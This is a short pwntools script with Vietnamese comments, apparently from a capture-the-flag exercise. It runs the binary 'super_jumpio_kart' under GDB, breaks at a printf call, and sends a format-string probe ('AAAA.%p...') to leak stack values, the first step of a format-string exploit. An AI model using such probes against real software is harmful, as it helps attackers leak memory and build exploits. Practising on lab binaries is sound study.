from pwn import *
import os

BINARY = './super_jumpio_kart'
context.binary = BINARY

CWD = os.getcwd()

# Script cho GDB:
# 1. Chuyển đến đúng thư mục
# 2. Đặt breakpoint ngay tại lệnh `call printf` mà chúng ta khai thác
# 3. Chạy chương trình
gdb_script = f"""
    cd {CWD}
    b *(_Z6customv+159)
    continue
"""

# Khởi động GDB và truyền script vào
p = gdb.debug(BINARY, gdbscript=gdb_script)

# Gửi input để chương trình chạy đến breakpoint
p.sendlineafter(b'> ', b'4')
# Gửi một chuỗi dễ nhận biết
p.sendlineafter(b'Power Up: ', b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p')

# Để script chạy ở chế độ tương tác để chúng ta có thể xem GDB
p.interactive()